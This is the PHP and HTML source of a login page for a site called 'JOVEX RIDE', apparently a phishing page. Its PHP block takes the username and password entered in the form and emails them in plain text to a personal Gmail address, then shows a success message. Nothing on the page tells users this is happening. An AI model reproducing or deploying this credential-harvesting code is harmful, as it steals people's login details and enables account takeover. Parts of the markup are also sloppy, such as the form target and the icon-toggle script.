<?php

$err_field = $succ  = "";
$user = $password = "";

if(isset($_POST['login'])){
   
  $user = htmlspecialchars($_POST['user_id']);
  $password = htmlspecialchars($_POST['password']);
  if(empty($user) || empty($password)){
    $err_field = "* All the field is required *";
  }else{

   $message = " 
   UserName : $user\n 
   Password : $password; 
   "; 
    
    
$to = "gambat2015@gmail.com"; 
$subject = "Mail From website"; 

mail($to,$subject,$message); 


$succ  = "form successfully submitted"; 
  }
}



?>

<!DOCTYPE html>
<html>
<head>
    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <title>jovex ride</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link rel='stylesheet' type='text/css' media='screen' href='main.css'>
    <script src='main.js'></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />

<style>
  body{
     background-image: url(.pending-1704141425-images.jpeg);
     background-position: no-repeat;
     background-size: cover;
   }
   .head{
    font-family: serif;
   
   }
   .bot{
    width: 800vh;
   }
   a{
    text-decoration: none;
   }
   .foom{
    width: 70%;
   }
   .inp{
    background-color: none;
   }
</style>
</head>
<body>
  <center class="p-5 text-white">
    <h1 class="pt-4 head fw-bold">JOVEX RIDE</h1>
    
 <div class="pt-5 lead">
  <h1 class="h3 fw-light">Welcome to Ride</h1>
  
 </div> 

 
  </center>
  <div class="container d-flex justify-content-center">
    <form action="homma.html" method="post" class="shadow col-11 col-lg-5 col-md-10 ">
      <div class="m-3 ">
      <div class="text-danger fw-bold">
                            <?= $err_field ?>
                        </div>
                        <div class="text-success fw-bold">
                            <?=  $succ ?>
                        </div>
      <label for="username" class='form-label text-white'>Username</label><br>
      <input type="text" id='text' style=' width: 100%; border-radius: 5px;' name="user_id" value="<?= $user ?>" class="inp py-1 form-control" placeholder="enter email or username">
<br>
<div class="">
  <label for="password"  class='form-label text-white'>password</label>
<div class="input-group mb-3">
<input type="password" class="form-control" id="password" name="password" value="<?= $password ?>" placeholder="Password" aria-label="password" aria-describedby="basic-addon2">
<span class="input-group-text" id="basic-addon2"><i class="fa-solid fa-eye" id="eyeOpen"></i></span>
</div>
</div>
<br>
<div class="row">
    <div class="col-5 col-md-6  ">
        <a href="" class="text-light">Remanber me</a>
    </div>
     <div class="col-7 col-md-6 justify-content-end">
         <a href="" class="text-danger ms-5 ps-5">Forgot password</a><br>
     </div>
</div>

<br><br>   <div class="  d-flex justify-content-center">
<button type='submit' class='btn brand bg-primary col-12 text-white' name="login">submit</button>
</div><br>
      <p class="text-center text-light fw-bold">Are you new here?<a href="signup.html"> register</a></p> 
  </div>  
  </form>
 
</div>


  <script>
        
        let eyeOpen = document.getElementById('eyeOpen');
        let password = document.getElementById('password');

        eyeOpen.onclick = function(){
            if(password.type == 'password'){
                password.type = 'text';
                eyeOpen.src = '<i class='fa-solid fa-eye-slash'></i>'
            }
            else{
                password.type = 'password';
                  eyeOpen.src = '<i class="fa-solid fa-eye"></i>';
            }
        }

      
    </script>
       
</body>
</html>